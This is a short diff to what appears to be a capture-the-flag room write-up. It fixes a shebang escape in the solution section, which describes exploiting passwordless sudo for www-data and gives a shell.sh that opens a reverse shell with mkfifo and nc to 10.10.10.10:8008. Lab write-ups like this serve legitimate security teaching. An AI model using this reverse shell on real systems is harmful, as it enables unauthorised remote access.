@@ -50,7 +50,7 @@ A shell for the machine would remove limitations imposed on the web command port
 <summary>Solution</summary>
 
 It's possible to finish the Room quickly with the web command portal after checking the www-data user's <code class="language-plaintext highlighter-rouge">sudo -ll</code> and learning they have root access through sudo without a password. It's also possible to get a root shell by creating a local file called shell.sh as:<br>
-\#!/bin/bash<br>
+#!/bin/bash<br>
 mkfifo /tmp/lol<br>
 nc 10.10.10.10 8008 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol<br>
 <br>
